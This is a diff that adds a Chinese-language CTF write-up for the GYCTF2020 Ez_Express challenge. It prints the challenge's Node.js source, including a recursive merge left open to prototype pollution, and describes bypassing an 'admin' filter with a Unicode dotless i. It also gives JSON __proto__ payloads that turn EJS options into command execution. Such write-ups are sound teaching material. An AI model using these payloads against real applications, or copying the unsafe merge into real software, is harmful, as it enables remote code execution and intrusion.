@@ -80,3 +80,114 @@ app.post('/register', (req, res) => {
 ```
 
 ![image-20260307203950831](https://gitee.com/bobrocket/img/raw/master/img/image-20260307203950831.png)
+
+### [GYCTF2020]Ez_Express
+
+进去是一个注册登录页面，扫一下目录发现有www.zip
+
+```js
+var express = require('express');
+var router = express.Router();
+const isObject = obj => obj && obj.constructor && obj.constructor === Object;
+const merge = (a, b) => {
+  for (var attr in b) {
+    if (isObject(a[attr]) && isObject(b[attr])) {
+      merge(a[attr], b[attr]);
+    } else {
+      a[attr] = b[attr];
+    }
+  }
+  return a
+}
+const clone = (a) => {
+  return merge({}, a);
+}
+function safeKeyword(keyword) {
+  if(keyword.match(/(admin)/is)) {
+      return keyword
+  }
+
+  return undefined
+}
+
+router.get('/', function (req, res) {
+  if(!req.session.user){
+    res.redirect('/login');
+  }
+  res.outputFunctionName=undefined;
+  res.render('index',data={'user':req.session.user.user});
+});
+
+
+router.get('/login', function (req, res) {
+  res.render('login');
+});
+
+
+
+router.post('/login', function (req, res) {
+  if(req.body.Submit=="register"){
+   if(safeKeyword(req.body.userid)){
+    res.end("<script>alert('forbid word');history.go(-1);</script>") 
+   }
+    req.session.user={
+      'user':req.body.userid.toUpperCase(),
+      'passwd': req.body.pwd,
+      'isLogin':false
+    }
+    res.redirect('/'); 
+  }
+  else if(req.body.Submit=="login"){
+    if(!req.session.user){res.end("<script>alert('register first');history.go(-1);</script>")}
+    if(req.session.user.user==req.body.userid&&req.body.pwd==req.session.user.passwd){
+      req.session.user.isLogin=true;
+    }
+    else{
+      res.end("<script>alert('error passwd');history.go(-1);</script>")
+    }
+  
+  }
+  res.redirect('/'); ;
+});
+router.post('/action', function (req, res) {
+  if(req.session.user.user!="ADMIN"){res.end("<script>alert('ADMIN is asked');history.go(-1);</script>")} 
+  req.session.user.data = clone(req.body);
+  res.end("<script>alert('success');history.go(-1);</script>");  
+});
+router.get('/info', function (req, res) {
+  res.render('index',data={'user':res.outputFunctionName});
+})
+module.exports = router;
+```
+
+我们发现了递归合并函数，不难推测是nodejs原型链污染
+
+在action路由下对merge进行调用，但是会校验身份admin
+
+[Fuzz中的javascript大小写特性 | 离别歌](https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html)
+
+我们用`admın`作为用户名进行注册，也是成功进去了
+
+下一步就是原型链污染了
+
+可以看到在`/info`下，使用将`outputFunctionName`渲染入`index`中，而`outputFunctionName`是未定义的
+
+```json
+{
+  "__proto__": {
+    "outputFunctionName": "x=1; return process.mainModule.require('child_process').execSync('cat /flag').toString(); //"
+  }
+}
+```
+
+EJS 会使用 `escapeFunction` 来处理模板中的变量。如果污染这个属性，你可以直接执行代码。
+
+```json
+{
+  "__proto__": {
+    "client": true,
+    "escapeFunction": "1; return process.mainModule.require('child_process').execSync('cat /flag').toString();"
+  }
+}
+```
+
